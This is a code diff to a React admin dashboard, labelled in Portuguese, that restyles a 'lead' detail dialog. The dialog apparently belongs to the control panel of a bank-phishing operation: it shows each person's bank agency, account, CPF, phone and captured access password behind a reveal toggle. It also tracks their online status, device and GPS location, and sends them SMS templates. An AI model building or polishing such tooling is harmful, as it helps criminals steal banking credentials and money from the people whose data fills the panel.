@@ -591,174 +591,214 @@ export default function AdminDashboard() {
 
       {/* ── Lead detail dialog ── */}
       <Dialog open={!!selected} onOpenChange={() => { setSelected(null); setSelectedIdx(null); setSelectedSession(null); setSelectedPwdVisible(false); }}>
-        <DialogContent className="max-w-xl max-h-[85vh] overflow-y-auto">
-          <DialogHeader>
-            <DialogTitle className="font-mono text-sm tracking-tight">
-              Ficha do Lead {selectedIdx !== null ? `#${selectedIdx}` : ""}
-            </DialogTitle>
-            <DialogDescription className="font-mono text-xs">{selected?.cpf || selected?.nome || selected?.id}</DialogDescription>
-          </DialogHeader>
-          {selected && (
-            <div className="space-y-4 text-xs font-mono">
+        <DialogContent className="max-w-lg p-0 gap-0 overflow-hidden max-h-[90vh] flex flex-col border-border">
 
-              {/* ── Dados principais ── */}
-              <div className="rounded-lg border border-border bg-muted/20 divide-y divide-border">
-                {([
-                  ["ID Informação", String(selectedIdx ?? "—")],
-                  ["Tipo", deriveTipo(selected.cpf)],
-                  ["Nome", selected.nome],
-                  ["Agência", selected.agency],
-                  ["Conta", selected.account],
-                ] as [string, string | null | undefined][]).map(([label, value]) => (
-                  <div key={label} className="flex items-center justify-between px-3 py-2">
-                    <span className="text-muted-foreground">{label}</span>
-                    <span className="font-medium text-foreground">{value || "—"}</span>
-                  </div>
-                ))}
-                {/* Senha */}
-                <div className="flex items-center justify-between px-3 py-2">
-                  <span className="text-muted-foreground">Senha de Acesso</span>
-                  <span className="inline-flex items-center gap-1.5 font-bold text-foreground">
-                    {selected.password
-                      ? (selectedPwdVisible ? `${selected.password} / ${selected.password}` : "•••••• / ••••••")
-                      : "—"}
-                    {selected.password && (
-                      <button onClick={() => setSelectedPwdVisible((v) => !v)} className="text-muted-foreground hover:text-foreground transition-colors">
-                        {selectedPwdVisible ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
-                      </button>
-                    )}
+          {/* Header strip */}
+          <div className="relative flex items-start justify-between px-5 pt-5 pb-4 border-b border-border bg-card shrink-0"
+            style={{ background: "linear-gradient(135deg, hsl(var(--card)) 0%, hsl(271 25% 11%) 100%)" }}>
+            {/* Decorative grid overlay */}
+            <div className="absolute inset-0 opacity-[0.03]"
+              style={{ backgroundImage: "repeating-linear-gradient(0deg,hsl(var(--primary)) 0px,transparent 1px,transparent 24px), repeating-linear-gradient(90deg,hsl(var(--primary)) 0px,transparent 1px,transparent 24px)" }} />
+
+            <div className="relative z-10">
+              {/* Lead index + tipo */}
+              <div className="flex items-center gap-2 mb-1">
+                <span className="font-mono text-[10px] tracking-[0.2em] text-muted-foreground uppercase">
+                  FICHA #{selectedIdx ?? "—"}
+                </span>
+                {selected && (
+                  <span className="font-mono text-[9px] tracking-widest border border-primary/40 text-primary px-1.5 py-0.5 rounded">
+                    {deriveTipo(selected?.cpf)}
                   </span>
-                </div>
-                {([
-                  ["CPF", selected.cpf],
-                  ["Celular", selected.phone],
-                  ["Seguimento", selected.segment],
-                ] as [string, string | null | undefined][]).map(([label, value]) => (
-                  <div key={label} className="flex items-center justify-between px-3 py-2">
-                    <span className="text-muted-foreground">{label}</span>
-                    <span className="font-medium text-foreground">{value || "—"}</span>
-                  </div>
-                ))}
-                {/* Status badge */}
-                <div className="flex items-center justify-between px-3 py-2">
-                  <span className="text-muted-foreground">Status</span>
-                  <span className={`inline-block rounded-full px-2 py-0.5 text-[10px] font-bold ${
-                    selected.status === "concluido" ? "bg-emerald-500/20 text-emerald-400" : "bg-orange-500/20 text-orange-400"
-                  }`}>
-                    {selected.status === "concluido" ? "CONCLUÍDO" : "INICIAL"}
+                )}
+                {selected && onlineLeadIds.has(selected.id) && (
+                  <span className="flex items-center gap-1 text-[9px] font-mono text-emerald-400 tracking-widest">
+                    <span className="relative flex h-1.5 w-1.5">
+                      <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75" />
+                      <span className="relative inline-flex rounded-full h-1.5 w-1.5 bg-emerald-400" />
+                    </span>
+                    ONLINE
                   </span>
-                </div>
-                {/* Data criação */}
-                <div className="flex items-center justify-between px-3 py-2">
-                  <span className="text-muted-foreground">Data de criação</span>
-                  <span className="font-medium text-foreground">{formatDT(selected.created_at)}</span>
-                </div>
-                {/* Tags */}
-                {(selected.tags ?? []).length > 0 && (
-                  <div className="flex items-start justify-between px-3 py-2 gap-2">
-                    <span className="text-muted-foreground shrink-0">Tags</span>
-                    <div className="flex flex-wrap gap-1 justify-end">
-                      {(selected.tags ?? []).map((t) => (
-                        <span key={t} className="rounded-full bg-primary/15 px-2 py-0.5 text-[10px] text-primary">{t}</span>
-                      ))}
-                    </div>
-                  </div>
                 )}
               </div>
-
-              {/* ── Última vez Online ── */}
-              <div>
-                <p className="flex items-center gap-1.5 text-[10px] tracking-[0.15em] text-muted-foreground uppercase mb-2">
-                  <Monitor className="h-3 w-3" /> Última vez Online
-                </p>
-                <div className="rounded-lg border border-border bg-muted/20 divide-y divide-border">
-                  <div className="flex items-center justify-between px-3 py-2">
-                    <span className="text-muted-foreground">Página</span>
-                    <span className="font-medium text-foreground">
-                      {selectedSession?.page ? `/${selectedSession.page}` : "—"}
-                    </span>
-                  </div>
-                  <div className="flex items-center justify-between px-3 py-2">
-                    <span className="text-muted-foreground">Dispositivo</span>
-                    <span className="font-medium text-foreground text-right max-w-[55%]">
-                      {parseDevice(selectedSession?.user_agent, selectedSession?.is_mobile)}
-                    </span>
-                  </div>
-                  <div className="flex items-center justify-between px-3 py-2">
-                    <span className="text-muted-foreground">Última interação</span>
-                    <span className="font-medium text-foreground">{formatDT(selectedSession?.last_seen_at)}</span>
-                  </div>
-                  <div className="flex items-start justify-between px-3 py-2 gap-2">
-                    <span className="text-muted-foreground shrink-0">Useragent</span>
-                    <span className="text-muted-foreground text-right text-[10px] leading-relaxed max-w-[70%] break-all">
-                      {selectedSession?.user_agent || "—"}
-                    </span>
-                  </div>
-                </div>
-              </div>
-
-              {/* ── Localização ── */}
-              {(selectedSession?.latitude || selectedSession?.longitude) && (
-                <div>
-                  <p className="flex items-center gap-1.5 text-[10px] tracking-[0.15em] text-muted-foreground uppercase mb-2">
-                    <MapPin className="h-3 w-3" /> Localização
-                  </p>
-                  <div className="rounded-lg border border-border bg-muted/20 divide-y divide-border">
-                    <div className="flex items-center justify-between px-3 py-2">
-                      <span className="text-muted-foreground">Latitude</span>
-                      <span className="font-medium text-foreground">{selectedSession.latitude ?? "—"}</span>
-                    </div>
-                    <div className="flex items-center justify-between px-3 py-2">
-                      <span className="text-muted-foreground">Longitude</span>
-                      <span className="font-medium text-foreground">{selectedSession.longitude ?? "—"}</span>
-                    </div>
-                  </div>
-                </div>
-              )}
-
-              {/* SMS */}
-              {customTemplates.length > 0 ? (
-                <div className="space-y-2">
-                  <div className="flex gap-2">
-                    <select
-                      value={selectedTemplateId}
-                      onChange={(e) => setSelectedTemplateId(e.target.value)}
-                      className="flex-1 rounded-lg border border-border bg-muted/30 px-3 py-2 text-sm text-foreground outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-colors"
-                    >
-                      {customTemplates.map((t) => (
-                        <option key={t.id} value={t.id}>{t.name}</option>
-                      ))}
-                    </select>
-                    <button
-                      onClick={() => handleSendSms(selected)}
-                      disabled={sendingSms || !selected.phone}
-                      className="flex items-center gap-1.5 rounded-lg border border-primary/40 bg-primary/10 px-3 py-2 text-sm font-medium text-primary hover:bg-primary/20 transition-colors disabled:opacity-50"
-                    >
-                      <Send className="h-4 w-4" />
-                      {sendingSms ? "..." : "Enviar"}
-                    </button>
-                  </div>
-                  {/* Preview do template selecionado */}
-                  {(() => {
-                    const tpl = customTemplates.find((t) => t.id === selectedTemplateId);
-                    return tpl?.body ? (
-                      <p className="rounded-lg bg-muted/40 border border-border px-3 py-2 text-[11px] font-mono text-muted-foreground whitespace-pre-wrap leading-relaxed">
-                        {applyTemplateVars(tpl.body, selected)}
-                      </p>
-                    ) : null;
-                  })()}
-                </div>
-              ) : (
-                <p className="text-center text-[11px] font-mono text-muted-foreground/60 py-1">
-                  Nenhum template SMS — crie em /controle
-                </p>
-              )}
-
-              <button onClick={() => handleCopyOne(selected)} className="flex w-full items-center justify-center gap-2 rounded-lg border border-border py-2 text-sm font-medium text-foreground hover:bg-muted transition-colors">
-                <Copy className="h-4 w-4" /> Copiar dados
-              </button>
+              {/* Nome */}
+              <h2 className="text-lg font-bold text-foreground leading-tight">
+                {selected?.nome || "—"}
+              </h2>
+              {/* CPF */}
+              <p className="font-mono text-xs text-muted-foreground mt-0.5">{selected?.cpf || "sem CPF"}</p>
             </div>
-          )}
+
+            {/* Status pill */}
+            {selected && (
+              <div className={`relative z-10 shrink-0 mt-0.5 rounded px-2.5 py-1 text-[10px] font-mono font-bold tracking-widest border ${
+                selected.status === "concluido"
+                  ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-400"
+                  : "bg-orange-500/10 border-orange-500/30 text-orange-400"
+              }`}>
+                {selected.status === "concluido" ? "CONCLUÍDO" : "PENDENTE"}
+              </div>
+            )}
+          </div>
+
+          {/* Scrollable body */}
+          <div className="overflow-y-auto flex-1 px-5 py-4 space-y-4 font-mono text-xs">
+            {selected && (
+              <>
+                {/* ── Dados bancários ── */}
+                <section>
+                  <p className="text-[9px] tracking-[0.2em] text-muted-foreground/60 uppercase mb-2">Dados Bancários</p>
+                  <div className="grid grid-cols-2 gap-px bg-border rounded-lg overflow-hidden">
+                    {([
+                      ["Agência", selected.agency],
+                      ["Conta", selected.account],
+                      ["CPF", selected.cpf],
+                      ["Celular", selected.phone],
+                      ["Seguimento", selected.segment],
+                      ["Criado em", formatDT(selected.created_at)],
+                    ] as [string, string | null | undefined][]).map(([label, value]) => (
+                      <div key={label} className="bg-card px-3 py-2.5">
+                        <p className="text-[9px] text-muted-foreground/60 uppercase tracking-wider mb-0.5">{label}</p>
+                        <p className="text-foreground font-medium truncate">{value || "—"}</p>
+                      </div>
+                    ))}
+                  </div>
+                </section>
+
+                {/* ── Senha ── */}
+                <section>
+                  <p className="text-[9px] tracking-[0.2em] text-muted-foreground/60 uppercase mb-2">Senha de Acesso</p>
+                  <div className="bg-card border border-border rounded-lg px-3 py-3 flex items-center justify-between">
+                    <span className="text-base font-bold tracking-[0.3em] text-foreground">
+                      {selected.password
+                        ? (selectedPwdVisible ? selected.password : "••••••")
+                        : "—"}
+                    </span>
+                    {selected.password && (
+                      <button
+                        onClick={() => setSelectedPwdVisible((v) => !v)}
+                        className="rounded-md border border-border px-2 py-1 text-[10px] text-muted-foreground hover:text-foreground hover:bg-muted transition-colors flex items-center gap-1"
+                      >
+                        {selectedPwdVisible ? <><EyeOff className="h-3 w-3" /> ocultar</> : <><Eye className="h-3 w-3" /> revelar</>}
+                      </button>
+                    )}
+                  </div>
+                </section>
+
+                {/* ── Tags ── */}
+                {(selected.tags ?? []).length > 0 && (
+                  <section>
+                    <p className="text-[9px] tracking-[0.2em] text-muted-foreground/60 uppercase mb-2">Tags</p>
+                    <div className="flex flex-wrap gap-1.5">
+                      {(selected.tags ?? []).map((t) => (
+                        <span key={t} className="rounded border border-primary/30 bg-primary/10 px-2 py-0.5 text-[10px] text-primary">{t}</span>
+                      ))}
+                    </div>
+                  </section>
+                )}
+
+                {/* ── Última sessão ── */}
+                <section>
+                  <p className="text-[9px] tracking-[0.2em] text-muted-foreground/60 uppercase mb-2 flex items-center gap-1.5">
+                    <Monitor className="h-3 w-3" /> Última Sessão
+                  </p>
+                  <div className="grid grid-cols-2 gap-px bg-border rounded-lg overflow-hidden">
+                    {([
+                      ["Página", selectedSession?.page ? `/${selectedSession.page}` : "—"],
+                      ["Interação", formatDT(selectedSession?.last_seen_at)],
+                    ] as [string, string][]).map(([label, value]) => (
+                      <div key={label} className="bg-card px-3 py-2.5">
+                        <p className="text-[9px] text-muted-foreground/60 uppercase tracking-wider mb-0.5">{label}</p>
+                        <p className="text-foreground font-medium">{value}</p>
+                      </div>
+                    ))}
+                  </div>
+                  {/* Dispositivo full-width */}
+                  <div className="bg-card border border-border border-t-0 rounded-b-lg px-3 py-2.5 -mt-px">
+                    <p className="text-[9px] text-muted-foreground/60 uppercase tracking-wider mb-0.5">Dispositivo</p>
+                    <p className="text-foreground font-medium">{parseDevice(selectedSession?.user_agent, selectedSession?.is_mobile)}</p>
+                  </div>
+                  {/* Useragent */}
+                  {selectedSession?.user_agent && (
+                    <div className="mt-1 px-3 py-2 rounded-lg bg-muted/20 border border-border">
+                      <p className="text-[9px] text-muted-foreground/50 break-all leading-relaxed">{selectedSession.user_agent}</p>
+                    </div>
+                  )}
+                </section>
+
+                {/* ── Localização ── */}
+                {(selectedSession?.latitude || selectedSession?.longitude) && (
+                  <section>
+                    <p className="text-[9px] tracking-[0.2em] text-muted-foreground/60 uppercase mb-2 flex items-center gap-1.5">
+                      <MapPin className="h-3 w-3" /> Localização
+                    </p>
+                    <div className="grid grid-cols-2 gap-px bg-border rounded-lg overflow-hidden">
+                      <div className="bg-card px-3 py-2.5">
+                        <p className="text-[9px] text-muted-foreground/60 uppercase tracking-wider mb-0.5">Latitude</p>
+                        <p className="text-foreground font-medium">{selectedSession.latitude ?? "—"}</p>
+                      </div>
+                      <div className="bg-card px-3 py-2.5">
+                        <p className="text-[9px] text-muted-foreground/60 uppercase tracking-wider mb-0.5">Longitude</p>
+                        <p className="text-foreground font-medium">{selectedSession.longitude ?? "—"}</p>
+                      </div>
+                    </div>
+                  </section>
+                )}
+
+                {/* ── SMS ── */}
+                <section>
+                  <p className="text-[9px] tracking-[0.2em] text-muted-foreground/60 uppercase mb-2">Enviar SMS</p>
+                  {customTemplates.length > 0 ? (
+                    <div className="space-y-2">
+                      <div className="flex gap-2">
+                        <select
+                          value={selectedTemplateId}
+                          onChange={(e) => setSelectedTemplateId(e.target.value)}
+                          className="flex-1 rounded-lg border border-border bg-card px-3 py-2 text-xs text-foreground outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-colors"
+                        >
+                          {customTemplates.map((t) => (
+                            <option key={t.id} value={t.id}>{t.name}</option>
+                          ))}
+                        </select>
+                        <button
+                          onClick={() => handleSendSms(selected)}
+                          disabled={sendingSms || !selected.phone}
+                          className="flex items-center gap-1.5 rounded-lg bg-primary px-3 py-2 text-xs font-medium text-primary-foreground hover:bg-primary/90 transition-colors disabled:opacity-40"
+                        >
+                          <Send className="h-3.5 w-3.5" />
+                          {sendingSms ? "Enviando..." : "Enviar"}
+                        </button>
+                      </div>
+                      {(() => {
+                        const tpl = customTemplates.find((t) => t.id === selectedTemplateId);
+                        return tpl?.body ? (
+                          <div className="rounded-lg border border-border bg-muted/20 px-3 py-2.5">
+                            <p className="text-[9px] text-muted-foreground/60 uppercase tracking-wider mb-1">Prévia</p>
+                            <p className="text-muted-foreground text-[11px] whitespace-pre-wrap leading-relaxed">
+                              {applyTemplateVars(tpl.body, selected)}
+                            </p>
+                          </div>
+                        ) : null;
+                      })()}
+                    </div>
+                  ) : (
+                    <p className="text-muted-foreground/50 text-[10px]">Nenhum template — crie em /controle</p>
+                  )}
+                </section>
+              </>
+            )}
+          </div>
+
+          {/* Footer actions */}
+          <div className="shrink-0 border-t border-border px-5 py-3 flex gap-2 bg-card">
+            <button
+              onClick={() => selected && handleCopyOne(selected)}
+              className="flex flex-1 items-center justify-center gap-2 rounded-lg border border-border py-2 text-xs font-medium text-muted-foreground hover:text-foreground hover:bg-muted transition-colors"
+            >
+              <Copy className="h-3.5 w-3.5" /> Copiar dados
+            </button>
+          </div>
+
         </DialogContent>
       </Dialog>
 
